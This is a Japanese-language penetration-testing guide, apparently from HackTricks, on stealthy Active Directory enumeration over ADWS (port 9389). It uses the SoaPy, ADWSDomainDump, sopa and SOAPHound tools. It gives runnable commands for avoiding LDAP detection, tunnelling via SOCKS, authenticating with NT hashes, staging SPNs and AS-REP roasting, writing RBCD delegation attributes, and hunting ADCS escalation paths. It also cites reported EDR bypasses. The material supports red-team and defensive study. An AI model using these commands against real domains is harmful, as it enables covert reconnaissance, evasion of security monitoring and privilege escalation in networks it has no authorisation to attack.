# Active Directory Web Services (ADWS) の列挙とステルス収集

{{#include ../../banners/hacktricks-training.md}}

## ADWS とは？

Active Directory Web Services (ADWS) は、**Windows Server 2008 R2 以降、すべての Domain Controller でデフォルトで有効化**されており、TCP **9389** でリッスンします。名前に反して、**HTTP は関与しません**。代わりに、独自の .NET framing protocol stack を通じて LDAP 形式のデータを公開します。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

トラフィックはこれらの binary SOAP frame 内にカプセル化され、一般的ではない port を通過するため、**ADWS 経由の enumeration は、従来の LDAP/389 および 636 traffic よりも inspection、filtering、signature detection の対象になりにくくなっています**。Operator にとって、これは次を意味します。<sup>[[1]](#references)[[7]](#references)</sup>

* よりステルス性の高い recon – Blue team は LDAP query に集中することが多い。
* **SOCKS proxy を介して 9389/TCP を tunneling**することで、**non-Windows host (Linux、macOS)** から収集できる自由度。
* LDAP 経由で取得できるものと同じ data (user、group、ACL、schema など) に加え、**write** を実行できる機能 (例: **RBCD** 用の `msDs-AllowedToActOnBehalfOfOtherIdentity`)。

ADWS interaction は WS-Enumeration 上に実装されています。すべての query は、LDAP filter/attribute を定義する `Enumerate` message で開始され、`EnumerationContext` GUID が返されます。その後、server 定義の result window まで result を stream する 1 つ以上の `Pull` message が続きます。<sup>[[7]](#references)</sup> Context は約 30 分後に期限切れになるため、tooling は state の喪失を避けるために result の page 処理、または filter の分割 (CN ごとの prefix query) を行う必要があります。<sup>[[8]](#references)</sup> Security descriptor を要求する場合は、`LDAP_SERVER_SD_FLAGS_OID` control を指定して SACL を除外してください。指定しない場合、ADWS は SOAP response から `nTSecurityDescriptor` attribute を単純に削除します。

> NOTE: ADWS は多くの RSAT GUI/PowerShell tool でも使用されるため、traffic が正規の admin activity に紛れ込む可能性があります。

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) は、**ADWS protocol stack を pure Python で完全に再実装したもの**です。NBFX/NBFSE/NNS/NMF frame を byte 単位で作成できるため、.NET runtime に触れることなく Unix-like system から収集できます。<sup>[[1]](#references)[[2]](#references)</sup>

### 主な機能

* **SOCKS 経由の proxying**をサポート (C2 implant から使用する場合に便利)。
* LDAP の `-q '(objectClass=user)'` と同一の細かな search filter。
* 任意の **write** operation ( `--set` / `--delete` )。
* BloodHound への直接 ingestion に対応する **BOFHound output mode**。<sup>[[3]](#references)</sup>
* 人間が読みやすい形式が必要な場合に timestamp / `userAccountControl` を見やすく整形する `--parse` flag。<sup>[[2]](#references)</sup>

### Targeted collection flag と write operation

SoaPy には、最も一般的な LDAP hunting task を ADWS 上で再現するための curated switch が用意されています。`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds` に加え、custom pull 用の raw `--query` / `--filter` knob があります。これらを、`--rbcd <source>` (`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定)、`--spn <service/cn>` (targeted Kerberoasting 用の SPN staging)、`--asrep` (`userAccountControl` の `DONT_REQ_PREAUTH` を変更) などの write primitive と組み合わせます。<sup>[[2]](#references)</sup>

`samAccountName` と `servicePrincipalName` のみを返す targeted SPN hunt の例:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
同じ host/credentials を使って findings を直ちに weaponise します。`--rbcds` で RBCD-capable objects を dump し、続いて `--rbcd 'WEBSRV01$' --account 'FILE01$'` を適用して、Resource-Based Constrained Delegation chain を準備します。完全な abuse path については、[Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照してください。

### Installation（operator host）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* LDAPクエリをTCP/9389上のADWS呼び出しに置き換え、LDAP-signature hitsを減らす`ldapdomaindump`のFork。
* `--force`が渡されない限り、9389への初期到達性チェックを実行する（port scansがnoisy/filteredな場合はprobeをスキップ）。
* Microsoft Defender for EndpointおよびCrowdStrike Falconに対してテストされ、READMEでバイパスの成功が報告されている。<sup>[[4]](#references)</sup>

### インストール
```bash
pipx install .
```
### 使用方法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型的な出力には、9389 の到達性チェック、ADWS bind、dump の開始/終了が記録されます：
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang向けの実用的なADWS client

soapyと同様に、[sopa](https://github.com/Macmod/sopa)はGolangでADWS protocol stack（MS-NNS + MC-NMF + SOAP）を実装し、次のようなADWS callを実行するためのcommand-line flagsを提供します。<sup>[[5]](#references)</sup>

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]`および`delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* その他、`groups`、`members`、`optfeature`、`info [version|domain|forest|dcs]`など

### Protocol mappingの要点

* LDAP-style searchesは、attribute projection、scope control（Base/OneLevel/Subtree）、paginationに対応した**WS-Enumeration**（`Enumerate` + `Pull`）経由で実行されます。
* Single-object fetchには**WS-Transfer**の`Get`を使用し、attribute changesには`Put`、deletionsには`Delete`を使用します。
* Built-in object creationには**WS-Transfer ResourceFactory**を使用し、custom objectsにはYAML templatesによって制御される**IMDA AddRequest**を使用します。
* Password operationsは**MS-ADCAP** actions（`SetPassword`、`ChangePassword`）です。<sup>[[5]](#references)</sup>

### Unauthenticated metadata discovery（mex）

ADWSはcredentialsなしでWS-MetadataExchangeを公開するため、authentication前にexposureをすばやく確認できます。<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery と Kerberos targeting に関する注意事項

`--dc` が省略され、`--domain` が指定されている場合、Sopa は SRV を介して DC を解決できます。次の順序でクエリを実行し、最も優先度の高い target を使用します:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
運用上、セグメント化された環境での失敗を避けるため、DC が制御する resolver を優先します。

* `--dns <DC-IP>` を使用すると、**すべての** SRV/PTR/forward lookup が DC DNS 経由で行われます。
* UDP がブロックされている場合、または SRV の応答が大きい場合は、`--dns-tcp` を使用します。
* Kerberos が有効で、`--dc` が IP の場合、sopa は正しい SPN/KDC targeting のために FQDN を取得する目的で **reverse PTR** を実行します。Kerberos を使用しない場合、PTR lookup は実行されません。

Example（IP + Kerberos、DC 経由で DNS を強制）：
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Auth material options

平文パスワードに加えて、sopa は **NT hashes**、**Kerberos AES keys**、**ccache**、および **PKINIT certificates**（PFX または PEM）を ADWS auth に使用できます。`--aes-key`、`-c`（ccache）、または certificate-based options を使用すると、Kerberos が暗黙的に使用されます。<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Templatesによるカスタムオブジェクトの作成

任意のオブジェクトクラスでは、`create custom` commandがIMDA `AddRequest`に対応するYAML templateを読み込みます:<sup>[[5]](#references)</sup>

* `parentDN`と`rdn`は、containerとrelative DNを定義します。
* `attributes[].name`は`cn`またはnamespacedな`addata:cn`をサポートします。
* `attributes[].type`には`string|int|bool|base64|hex`または明示的な`xsd:*`を指定できます。
* `ad:relativeDistinguishedName`や`ad:container-hierarchy-parent`は含めないでください。sopaが自動的に挿入します。
* `hex` valuesは`xsd:base64Binary`に変換されます。空のstringを設定するには`value: ""`を使用します。

## SOAPHound – 大規模ADWS Collection（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)は、すべてのLDAP interactionsをADWS内で実行し、BloodHound v4-compatible JSONを出力する.NET collectorです。最初に`objectSid`、`objectGUID`、`distinguishedName`、`objectClass`の完全なcacheを一度構築し（`--buildcache`）、その後これを再利用して、大規模な`--bhdump`、`--certdump`（ADCS）、または`--dnsdump`（AD-integrated DNS）passを実行します。これにより、DCの外部に送信されるcritical attributesは約35個だけになります。AutoSplit（`--autosplit --threshold <N>`）は、クエリをCN prefixごとに自動的にshard化し、大規模なforestで30分間のEnumerationContext timeoutを回避します。<sup>[[8]](#references)</sup>

domain-joined operator VMでのTypical workflow:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
ExportされたJSONをそのままSharpHound/BloodHoundのワークフローに投入できます。下流でのグラフ化のアイデアについては、[BloodHound methodology](bloodhound.md)を参照してください。AutoSplitにより、ADExplorer形式のsnapshotよりもquery数を抑えながら、数百万オブジェクト規模のforestでもSOAPHoundの耐性を維持できます。

## Stealth AD Collection Workflow

以下のワークフローでは、LinuxからADWS経由で**domain & ADCS objects**をenumerateし、それらをBloodHound JSONに変換して、certificate-based attack pathsを探索する方法を示します。

1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  `export HTTPS_PROXY=socks5://127.0.0.1:1080`を実行するか、SoaPyの`--proxyHost/--proxyPort`を使用します。

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NCからADCS関連オブジェクトを収集する：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound に変換:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIPをBloodHound GUIにアップロード**し、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` などのcypherクエリを実行して、証明書による権限昇格パス（ESC1、ESC8など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity`（RBCD）の書き込み
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
これを `s4u2proxy`/`Rubeus /getticket` と組み合わせて、完全な **Resource-Based Constrained Delegation** chain を構築します（[Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

## Tooling Summary

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、read/write |
| 大量の ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、cache-first、BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch logs を変換 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 同じ SOCKS 経由で proxy 可能 |
| ADWS enumeration と object changes | [sopa](https://github.com/Macmod/sopa) | 既知の ADWS endpoints と interface する generic client - enumeration、object creation、attribute modifications、password changes が可能 |

## References

- [1] [SpecterOps – SOAP(y)を使用する – ADWSを使用した stealthy AD Collection の Operators Guide](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX、MC-NBFSE、MS-NNS、MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWSを介した Active Directory environments の stealthy Enumeration](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS経由で Active Directory data を収集する SOAPHound tool](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
